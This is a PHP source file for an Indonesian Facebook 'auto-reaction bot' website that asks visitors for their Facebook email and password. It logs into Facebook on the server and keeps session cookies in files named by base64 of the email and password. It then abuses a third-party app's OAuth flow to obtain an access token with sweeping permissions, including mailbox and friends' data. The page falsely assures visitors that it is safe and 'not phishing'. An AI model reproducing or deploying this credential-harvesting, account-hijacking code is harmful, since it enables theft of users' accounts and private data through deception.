<?php
 /* -> RobotReactionV3 by Nry-Xploit <- */
session_start();
   if(isset($_POST[email])){
   $a=$_POST[email];
   $b=$_POST[pass];
   $c = $a.'~'.$b;
   if(!is_dir('cokisx')){
   mkdir('cokisx');
   }
   if(!is_dir('logx')){
   mkdir('logx');
   }
   if(!is_dir('typex')){
   mkdir('typex');
   }
       $login=array(
       'email' => $a,
       'pass' => $b,
       'login' => 'Log in',
       );
$cokis = base64_encode($c);
  getToken($login,'https://m.facebook.com/login.php',$cokis);
$file=file_get_contents('cokisx/'.$cokis);
if(preg_match("/checkpoint/",$file)){
unlink('cokisx/'.$cokis);
$head = "Robot Reaction Beranda";
head($head);
     $apa='<b>INFO: </b>Akun Kamu Terkunci Silahkan Buka <a target="_blank" href="//berharap.ml/glype/browse.php?u=https://m.facebook.com">Proxy</a> dan Verif Akun Facebook Kamu. Setalah Akun Sudah Terbuka. Kembali Lagi Kesini, dan Ulangi.';
     eror($apa);
     home();
cokor();
      exit;
      }
 if(preg_match('/c_user/',$file)){
 $ambil=getToken('https://m.facebook.com/v2.0/dialog/oauth?redirect_uri=http://account.nokia.com/acct/account/_COPY_All_URL_ACCESS_TOKEN_FROM_ADDRESS_BAR_&scope=email,publish_actions,user_about_me,user_actions.books,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_actions.books,friends_actions.music,friends_actions.news,friends_actions.video,friends_activities,friends_birthday,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_management,create_event,create_note,export_stream,friends_online_presence,manage_friendlists,manage_notifications,manage_pages,photo_upload,publish_stream,read_friendlists,read_insights,read_mailbox,read_page_mailboxes,read_requests,read_stream,rsvp_event,share_item,sms,status_update,user_online_presence,video_upload,xmpp_login&response_type=token,code&client_id=200758583311692',$cokis);
 if(preg_match("/access_token=/",$ambil)){
$token=substr($ambil,strpos($ambil,'token=')+6,(strpos($ambil,'&')-(strpos($ambil,'token=')+6)));
$me=getUrl('/me',$token);
  if($me[id]){
    $_SESSION[id]= $me[id];
  $_SESSION[nama]= $cokis;
  $_SESSION[token]= $token;
header('Location: panel.php');
   }else{
   unlink('cokisx/'.$cokis);
   $head = "Robot Reaction Beranda";
head($head);
 $apa = 'Gagal Mengambil Access Token, Ada Masalah. Coba Lagi atau Hubungi Admin.';
 eror($apa);
cokor();
 }
}else{
$head = "Robot Aplikasi";
head($head);
$apa ='<b>INFO: </b>Kamu Belum Mengijinkan Aplikasi Nokia Account <a target="_blank" href="https://facebook.com/v2.0/dialog/oauth?redirect_uri=http://account.nokia.com/acct/account/_COPY_All_URL_ACCESS_TOKEN_FROM_ADDRESS_BAR_&scope=email,publish_actions,user_about_me,user_actions.books,user_actions.music,user_actions.news,user_actions.video,user_activities,user_birthday,user_education_history,user_events,user_games_activity,user_groups,user_hometown,user_interests,user_likes,user_location,user_notes,user_photos,user_questions,user_relationship_details,user_relationships,user_religion_politics,user_status,user_subscriptions,user_videos,user_website,user_work_history,friends_about_me,friends_actions.books,friends_actions.music,friends_actions.news,friends_actions.video,friends_activities,friends_birthday,friends_education_history,friends_events,friends_games_activity,friends_groups,friends_hometown,friends_interests,friends_likes,friends_location,friends_notes,friends_photos,friends_questions,friends_relationship_details,friends_relationships,friends_religion_politics,friends_status,friends_subscriptions,friends_videos,friends_website,friends_work_history,ads_management,create_event,create_note,export_stream,friends_online_presence,manage_friendlists,manage_notifications,manage_pages,photo_upload,publish_stream,read_friendlists,read_insights,read_mailbox,read_page_mailboxes,read_requests,read_stream,rsvp_event,share_item,sms,status_update,user_online_presence,video_upload,xmpp_login&response_type=token,code&client_id=200758583311692">Klik Disini </a> Untuk Mengijinkan. Setelah Itu Reload/Refresh Halaman Ini.';
eror($apa);
home();
cokor();
}
}else{
unlink('cokisx/'.$cokis); 
$head = "Data Facebook Salah";
head($head);
      echo'<div class="container"><div class="alert alert-info"><button type="button" class="close" data-dismiss="alert">&times;</button><b>INFO: </b>Gunakan Kode Negara Jika Email Menggunakan Nomer Ponsel, Saya Sarankan sih Pake Username Aja</div></div><p>'; 
$apa ='<b>INFO: </b>Email/Pasword Salah, Silahkan Coba Lagi..</div></div><p>';
eror($apa);
      home();
cokor();
}
}elseif(isset($_GET[Hapus])){
$cinta = $_SESSION[id];
$data = $_GET[Hapus];
unlink('cokisx/'.$data);
unlink('logx/'.$data.'.txt');
unlink('typex/'.$cinta);
session_destroy();
$head = "Hapus Robot Berhasil";
head($head);
$eror= 'Data Berhasil Dihapus Diserver Kami, Bot Tidak akan Berjalan Lagi';
eror($eror);
home();
cokor();
exit;
 }elseif(isset($_SESSION[nama])){
header('Location: panel.php');
}else{
$head = "Robot Reaction Facebook";
      head($head);
      echo '<div class="container theme-showcase" role="main">
      <div class="jumbotron">
<h1 style="text-align: center;"><font color="009c84">Welcome to Berharap.ml</font></h1>
        <p><b>Berharap.ml</b> adalah Layanan Robot Facebook yang Memungkinkan Akun Kamu Melakukan Tanggapan Distatus Teman </p>
        </div>
      </div>        
      </div>';
       echo ' <div class="container"><div class="alert alert-info"><button type="button" class="close" data-dismiss="alert">&times;</button><b>INFO: </b>Saya Sarankan Kamu Untuk Menambahkan Nomor Ponsel, Biar Akun Facebook Kamu Terkunci Ga Harus Tebak Photo.</div></div><p>';
   echo ' <div class="container">
      <div class="panel panel-primary">
<div class="panel-heading"> <img src="https://z-1-static.xx.fbcdn.net/rsrc.php/v3/yR/r/wHyx5kjomL3.png"> Login Robot Reaction</div>
<div class="panel-body">
      <form action="" method="POST" class="form-signin">
        <label for="inputEmail" class="sr-only">Email address</label>
        <input type="text" name="email" class="form-control" placeholder="Email address" required autofocus>
        <label for="inputPassword" class="sr-only">Password</label>
        <input type="password" name="pass" class="form-control" placeholder="Password" required>
        </div><center>
        <button class="btn btn-lg btn-success" type="submit">Login</button></center><br>
      </form>
      </div></div></div>';
  echo '<div class="container">
      <div class="panel panel-info">
<div class="panel-heading">Ada Apa Dalam ?</div>
<div class="panel-body">
<li> Bot Reaction Suka</li>
<li> Bot Reaction Super</li>
<li> Bot Reaction Haha</li>
<li> Bot Reaction Wow</li>
<li> Bot Reaction Sedih</li>
<li> Bot Reaction Marah</li>
<li> Bot Reaction Random ( Pilihan Diatas ) </li>
</div></div>';
   echo '<div class="panel panel-info">
<div class="panel-heading">Apakah ini Gratis ?</div>
<div class="panel-body">
Situs Kami 100% Gratis, Kecuali Jika Mau Donasi ya Silahkan :D </div></div>';
   echo '<div class="panel panel-info">
<div class="panel-heading">Apakah Ini Aman ?</div>
<div class="panel-body">
Ya Situs Kami Benar-Benar Aman. Percayakan Akun Facebook Anda Bersama Kami</div></div>';
    echo '<div class="panel panel-info">
<div class="panel-heading">Tidak Mempromosikan Situs/Spam!</div>
<div class="panel-body">
Kami Tidak Mempromosikan Link-Link Tertentu Atas Nama Anda, Kami Benar-Benar Aman.</div></div>';
    echo '<div class="panel panel-info">
<div class="panel-heading">Bukan Phising</div>
<div class="panel-body">
Ini Bukanlah Phising yang Mengatas Namakan Robot Reaction.</div></div>';
      echo '<div class="panel panel-info">
<div class="panel-heading">Kenapa Harus Email dan Password ?</div>
<div class="panel-body">
Bot Reaction Ga Bisa Pake Access Token! Makanya Kami Menggunakan Data Facebook Kamu.</div></div>';
     echo '<div class="panel panel-info">
<div class="panel-heading">Donasi ?</div>
<div class="panel-body">
<li>089665955072</li>
<li>087828770440</li>
<li>nry.xploit@gmail.com</li>
  </div></div></div>';
cokor();
 }
 
 function getFb($ah,$uh){
      $um=array(
      'graph',
      'facebook',
      'com',
      );
      $go='https://'.implode('.',$um);
      return $go.$ah.$uh;
}
function getToken($url,$xx=null,$cokis=null){
$me=$_SERVER[HTTP_USER_AGENT];
if($cokis){
     $ch=curl_init();
    curl_setopt_array($ch,array(
      CURLOPT_URL => $xx,
     CURLOPT_RETURNTRANSFER => 1,
     CURLOPT_USERAGENT => $me,
       CURLOPT_REFERER => $xx,
        CURLOPT_POST => 1,
         CURLOPT_POSTFIELDS => $url,
        CURLOPT_SSL_VERIFYPEER => true,
          CURLOPT_ENCODING => '',
        CURLOPT_COOKIEJAR => 'cokisx/'.$cokis,
   CURLOPT_COOKIEFILE => 'cokisx/'.$cokis,));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
   $cx=curl_exec($ch);
       curl_close($ch);
          return ($cx);
             }else{
     $ch=curl_init();
     curl_setopt_array($ch,array(
     CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_USERAGENT => $me,
    CURLOPT_HEADER => 1,
    CURLOPT_ENCODING => '',
    CURLOPT_COOKIEFILE => 'cokisx/'.$xx,));
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
      $cx=curl_exec($ch);
  curl_close($ch);
     return ($cx);
}
        }           
function auto($url){
   $ch=curl_init();
   curl_setopt_array($ch,array(
   CURLOPT_URL => $url,
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_CONNECTTIMEOUT => 5,
   ));
   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
   $cx=curl_exec($ch);
   curl_close($ch);
   return $cx;
}
function getUrl($string,$token,$as=null){
  $plin=array(
  'access_token' => $token,
  );
  if($as){
  $mer=array_merge($plin,$as);
  }else{
  $mer=$plin;
  }
  foreach($mer as $k => $o){
  $jek[]=$k.'='.$o;
  }
  $im='?'.implode('&',$jek);
  $im=getFb($string,$im);
  $im=json_decode(auto($im),true);
  if($im[data]){
  return $im[data];
  }else{
  return $im;
  }
}
      function home(){
   echo ' <div class="container">
      <div class="panel panel-primary">
<div class="panel-heading"><img src="https://z-1-static.xx.fbcdn.net/rsrc.php/v3/yR/r/wHyx5kjomL3.png">Bot Reaction Facebook</div>
<div class="panel-body">
      <form action="" method="POST" class="form-signin">
        <label for="inputEmail" class="sr-only">Email address</label>
        <input type="text" name="email" class="form-control" placeholder="Email address" required autofocus>
        <label for="inputPassword" class="sr-only">Password</label>
        <input type="password" name="pass" class="form-control" placeholder="Password" required>
        </div><center>
        <button class="btn btn-lg btn-success" type="submit">Login</button></center><br>
      </form>
      </div></div>';
    }
    
 function eror($apa){
echo '<div class="container"><div class="panel panel-success">
<div class="panel-heading"> <img src="https://z-1-static.xx.fbcdn.net/rsrc.php/v3/yt/r/bMltPkpSVR1.png">Pemberitahuan</div><div class="panel-body">
'.$apa.'
</div></div></div>';
}
function head($head){
echo '<!DOCTYPE html PUBLIC -//W3C//DTD XHTML 1.0 Strict//EN http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd>
<html lang="en">
<head title="Robot Beranda Facebook">
<title>Berharap.ml | '.$head.'</title>
<link rel="shortcut icon" href="//bertena.ga/Material/img/favicon.ico">
<meta name="description" content="Robot Beranda | Tanggapi Status Teman Facebook Kamu Secara Otomatis" />
<meta charset="utf-8">
<meta name="keywords" content=" Robot Beranda, Robot Wow, Robot Super, Robot Like, Robot Sad, Robot Sedih, Robot Marah, Robot Angry, Robot Like, Robot Love, Autolike Facebook, Increase Facebook Likes, AutoCommenter, Facebook Hack, Facebook Status Liker, CST Liker, Indonesia Autolike, Autolike status, Autolike Photo, ,Autolike Fans Page ,Bot komen ,Bot Like, Bom Like,Bomer Like, Big Like, Facebook, Google, Yahoo, Mywapblog, Bot koplak, Alexa, Ping, Twitter, Indonesian Likers, Autoliker, FB Autolike, FB Autoliker, FB Status Autolike, Indonesian Liker, Autolike 2014, Autolike, Jempol, Hublaa, Like" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
<meta property="og:image" content="//bertena.ga/Material/img/icon.png"/>
<meta http-equiv="expires" content="0">
<meta name="copyright" content="Copyright © Berharap.ml">
<meta name="author" content="Nry-Xploit Feat Script Kiddies">
<meta name="charset" content="UTF-8">
<meta name="distribution" content="Global">
<meta name="rating" content="General">
<meta name="robots" content="Autolike,hublaa,CST Liker,Yaz4rt,IndoLikerz,Hembus,auto follower,autolike page,auto komen">
    <link href="/css/bootstrap.css" rel="stylesheet">         
    <link href="/css/bootstrap.min.css" rel="stylesheet">
           <link href="/css/bootstrap-theme.css" rel="stylesheet">
  <link href="/css/bootstrap-theme.min.css" rel="stylesheet">
<script type="text/javascript">
var uid = "37480";
var wid = "297490";
</script>
<script type="text/javascript" src="//cdn.popcash.net/pop.js"></script>
</head>

  <body>
<!-- Static navbar -->
<nav class="navbar navbar-default">
<div class="container-fluid">
<div class="navbar-header">
<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
<span class="sr-only"> Toggle navigation </span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
<a class="navbar-brand" href="/">Berharap.ml</a>
</div>
<div id="navbar" class="navbar-collapse collapse">
<ul class="nav navbar-nav navbar-right">
<li class="active">
<a href="//Berharap.ml/">Home</a></li>
<li><a href="//Berharap.ml/contact.php">Contact</a></li>
</ul>
</div>
</div>
</nav>';
}
function cokor(){
echo '<div class="progress progress-striped active">
<div class="progress-bar" style="width: 100%"></div></div>
         <div id="footer" class="jumbotron" style="padding: 20px;text-align: center;margin-bottom: 0px;">
<div id="google_translate_element"></div>
<hr>
<div id="histats_counter"></div>
<strong>Copyright &copy; 2017 <a href="//Berharap.ml">Berharap.ml</a> All Right Reserved. </strong></font>
</div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
    <script src="/js/bootstrap.min.js"></script>
</body>

</html>';
}
?>
<script type="text/javascript">var _Hasync= _Hasync|| [];
_Hasync.push(['Histats.startgif', '1,3728586,4,10050,"div#histatsC {position: absolute;top:0px;left:0px;}body>div#histatsC {position: fixed;}"']);
_Hasync.push(['Histats.fasi', '1']);
_Hasync.push(['Histats.track_hits', '']);
(function() {
var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
hs.src = ('//s10.histats.com/js15_gif_as.js');
(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
})();</script>
<noscript><a href="/" alt="free counter" target="_blank" ><div id="histatsC"><img border="0" src="http://s4is.histats.com/stats/i/3728586.gif?3728586&103"></div></a>
</noscript>



<script type="text/javascript">var _Hasync= _Hasync|| [];
_Hasync.push(['Histats.start', '1,3728586,4,406,165,100,00011111']);
_Hasync.push(['Histats.fasi', '1']);
_Hasync.push(['Histats.track_hits', '']);
(function() {
var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
hs.src = ('//s10.histats.com/js15_as.js');
(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
})();</script>
<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?3728586&101" alt="free counter" border="0"></a></noscript>

<a href="https://autofaucet.io/?r=1YbyKVEHxNz1j68MopP1Kn98rvxuTfmnK"><img src="https://autofaucet.io/imgs/banners/728x90.gif" /></a>

<script language=JavaScript>
<!--

//Disable right mouse click Script
//By Maximus (maximus@nsimail.com) w/ mods by DynamicDrive
//For full source code, visit http://www.dynamicdrive.com

var message="Asolo Kang Copas";

///////////////////////////////////
function clickIE4(){
if (event.button==2){
alert(message);
return false;
}
}

function clickNS4(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
alert(message);
return false;
}
}
}

if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
document.onmousedown=clickIE4;
}

document.oncontextmenu=new Function("alert(message);return false")

// -->
</script>

<script type="text/javascript">
function googleTranslateElementInit() {
new google.translate.TranslateElement({pageLanguage: 'inggris', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
}
</script><script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
?>